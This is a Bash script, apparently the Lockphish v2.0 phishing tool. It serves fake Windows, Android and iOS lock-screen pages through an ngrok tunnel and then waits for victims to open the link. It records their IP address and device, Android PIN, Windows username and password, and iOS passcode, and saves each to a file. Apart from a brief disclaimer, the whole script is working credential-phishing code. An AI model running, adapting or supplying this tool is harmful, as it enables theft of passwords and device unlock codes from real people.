#!/bin/bash
# Lockphish v2.0
# Coded by: github.com/kali-linux-tutorial/lockphish 
# Twitter: twitter.com/kalilinux_in
# https://www.kalilinux.in
# Read the License before using any part from this code.

trap 'printf "\n";stop' 2

banner() {
  printf "\e[1;33m    __            _    \e[0m\e[1;77m      _     _     _      \e[0m\n"
  printf "\e[1;33m   / /  ___   ___| | __\e[0m\e[1;77m_ __ | |__ (_)___| |__   \e[0m\n"
  printf "\e[1;33m  / /  / _ \ / __| |/ /\e[0m\e[1;77m '_ \| '_ \| / __| '_ \  \e[0m\n"
  printf "\e[1;33m / /__| (_) | (__|   <|\e[0m\e[1;77m |_) | | | | \__ \ | | | \e[0m\n"
  printf "\e[1;33m \____/\___/ \___|_|\_\ \e[0m\e[1;77m.__/|_| |_|_|___/_| |_| By FTM\e[0m\n"
  printf "\e[1;77m                      |_|                  \e[0m\e[1;33mv2.0\e[0m\n"

  printf " \n\e[1;77m coded by: github.com/kali-linux-tutorial/lockphish\e[0m \n"
  printf " \e[1;77mTwitter: twitter.com/kalilinux_in\e[1;77m\e[0m"
  printf "\n\n\n\e[1;91m Disclaimer: this tool is designed for security\n"
  printf " testing in an authorized simulated cyberattack\n"
  printf " Attacking targets without prior mutual consent\n"
  printf " is illegal! by FTM\e[0m\n"
  printf "\n"
}

stop() {
  checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
  checkphp=$(ps aux | grep -o "php" | head -n1)
  checkssh=$(ps aux | grep -o "ssh" | head -n1)
  if [[ $checkngrok == *'ngrok'* ]]; then
    pkill -f -2 ngrok > /dev/null 2>&1
    killall -2 ngrok > /dev/null 2>&1
  fi

  if [[ $checkphp == *'php'* ]]; then
    killall -2 php > /dev/null 2>&1
  fi

  if [[ $checkssh == *'ssh'* ]]; then
    killall -2 ssh > /dev/null 2>&1
  fi

  exit 1
}

dependencies() {
  command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
}

catch_ip() {
  ip=$(grep -a 'IP:' ip.txt | cut -d " " -f2 | tr -d '\r')
  IFS=$'\n'
  device=$(grep -o ';.*;*)' ip.txt | cut -d ')' -f1 | tr -d ";")
  printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] IP:\e[0m\e[1;77m %s\e[0m\n" $ip
  printf "\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Device:\e[0m\e[1;77m %s\e[0m\n" $device
  cat ip.txt >> saved.ip.txt
}

checkfound() {
  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
  while [ true ]; do
    if [[ -e "ip.txt" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Target opened the link!\n"
      catch_ip
      rm -rf ip.txt
    fi

    sleep 0.5

    if [[ -e "pin.txt" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Android PIN received!\e[0m\n"
      pin=$(tail -n1 pin.txt)
      printf "\e[1;92m[\e[0m+\e[1;92m] PIN:\e[0m\e[1;77m %s\e[0m\n" $pin
      printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m pin.saved.txt\e[0m\n"
      cat pin.txt >> pin.saved.txt
      rm -rf pin.txt
    fi

    if [[ -e "passwords.txt" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] Win credentials received!\e[0m\n"
      username=$(tail -n1 usernames.txt)
      password=$(tail -n1 passwords.txt)
      printf "\e[1;92m[\e[0m+\e[1;92m] Username:\e[0m\e[1;77m %s\e[0m\n" $username
      printf "\e[1;92m[\e[0m+\e[1;92m] Password:\e[0m\e[1;77m %s\e[0m\n" $password
      printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m win.saved.txt\e[0m\n"
      cat usernames.txt >> win.saved.txt
      cat passwords.txt >> win.saved.txt
      rm -rf usernames.txt
      rm -rf passwords.txt
    fi

    if [[ -e "passcode.txt" ]]; then
      printf "\n\e[1;92m[\e[0m+\e[1;92m] IOS passcode received!\e[0m\n"
      passcode=$(tail -n1 passcode.txt)
      printf "\e[1;92m[\e[0m+\e[1;92m] Passcode:\e[0m\e[1;77m %s\e[0m\n" $passcode
      printf "\e[1;92m[\e[0m+\e[1;92m] Saved:\e[0m\e[1;77m ios.saved.txt\e[0m\n"
      cat passcode.txt >> ios.saved.txt
      rm -rf passcode.txt
    fi

  done
}

create_mask() {
  mask_link=$(curl -s -N https://www.maskpng.com/random)
  printf "\e[1;92m[\e[0m+\e[1;92m] Mask link generated:\e[0m\e[1;77m %s\e[0m\n" $mask_link
}

ngrok_server() {
  if [[ -e ngrok ]]; then
    echo ""
  else
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
    arch=$(uname -a | grep -o 'arm' | head -n1)
    arch2=$(uname -a | grep -o 'Android' | head -n1)
    arch3=$(uname -a | grep -o 'amd64' | head -n1)
    if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
      wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
    elif [[ $arch3 == *'amd64'* ]]; then
      wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
    else
      wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
    fi

    command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
    printf "\e[1;92m[\e[0m+\e[1;92m] Unzipping Ngrok...\n"
    unzip ngrok-stable-linux-* > /dev/null 2>&1
    command -v mv > /dev/null 2>&1 || { echo >&2 "I require mv but it's not installed. Aborting."; exit 1; }
    printf "\e[1;92m[\e[0m+\e[1;92m] Moving ngrok binary to /usr/bin...\n"
    mv ngrok /usr/bin/
  fi

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
  php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
  sleep 2
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
  ngrok http 3333 > /dev/null 2>&1 &
  sleep 10

  payload_ngrok
  checkfound
}

payload_ngrok() {
  url=$redirect
  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
  payload_name="index"
  printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building webpages\e[0m\n"
  sed 's+forwarding_url+'$url'+g' post.php > cat.php
  sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
  sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
  sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html

  IFS=$'\n'
  data_base64=$(base64 -w 0 win2.html)
  temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

  sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html

  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
  printf "\e[1;92m[\e[0m+\e[1;33m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
}

start1() {
  if [[ -e sendlink ]]; then
    rm -rf sendlink
  fi

  printf "\n"
  printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Serveo.net\e[0m\n"
  printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
  default_option_server="1"
  read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose a Port Forwarding option: \e[0m' option_server
  option_server="${option_server:-${default_option_server}}"
  if [[ $option_server -eq 1 ]]; then
    command -v php > /dev/null 2>&1 || { echo >&2 "I require ssh but it's not installed. Install it. Aborting."; exit 1; }
    start
  elif [[ $option_server -eq 2 ]]; then
    ngrok_server
  else
    printf "\e[1;93m [!] Invalid option!\e[0m\n"
    sleep 1
    clear
    start1
  fi
}

payload() {
  link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
  url=$redirect
  link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
  payload_name="payload"
  printf "\e[1;77m[\e[0m\e[1;33m+\e[0m\e[1;77m] Building webpage\e[0m\n"
  sed 's+forwarding_url+'$url'+g' post.php > cat.php
  sed 's+forwarding_link+'$link'+g' win.html | sed 's+forwarding_url+'$url'+g' > win2.html
  sed 's+forwarding_link+'$link'+g' phone.html | sed 's+forwarding_url+'$url'+g' > iphone2.html
  sed 's+forwarding_link+'$link'+g' droid.html | sed 's+forwarding_url+'$url'+g' > droid2.html

  IFS=$'\n'
  data_base64=$(base64 -w 0 win2.html)
  temp64="$( echo "${data_base64}" | sed 's/[\\&*./+!]/\\&/g' )"

  sed 's+forwarding_link+'$link'+g' template.html | sed 's+payload_name+'$payload_name'+g' | sed 's+data_base64+'${temp64}'+g ' > index2.html

  printf "\e[1;92m[\e[0m+\e[1;33m] Direct link:\e[0m\e[1;77m %s\e[0m\n" $link
}

start() {
  if [[ -e ngrok ]]; then
    echo ""
  else
    command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
    printf "\e[1;92m[\e[0m+\e[1;92m] Downloading Ngrok...\n"
    arch=$(uname -a | grep -o 'arm' | head -n1)
    arch2=$(uname -a | grep -o 'Android' | head -n1)
    arch3=$(uname -a | grep -o 'amd64' | head -n1)
    if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]]; then
      wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1
    elif [[ $arch3 == *'amd64'* ]]; then
      wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
    else
      wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
    fi

    command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
    printf "\e[1;92m[\e[0m+\e[1;92m] Unzipping Ngrok...\n"
    unzip ngrok-stable-linux-* > /dev/null 2>&1
    command -v mv > /dev/null 2>&1 || { echo >&2 "I require mv but it's not installed. Aborting."; exit 1; }
    printf "\e[1;92m[\e[0m+\e[1;92m] Moving ngrok binary to /usr/bin...\n"
    mv ngrok /usr/bin/
  fi

  printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
  php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
  sleep 2
  printf "\e[1;92m[\e[0m+\e[1;92m] Starting ngrok server...\n"
  ./ngrok http 3333 > /dev/null 2>&1 &
  sleep 10

  payload
  checkfound
}

banner
dependencies
start1
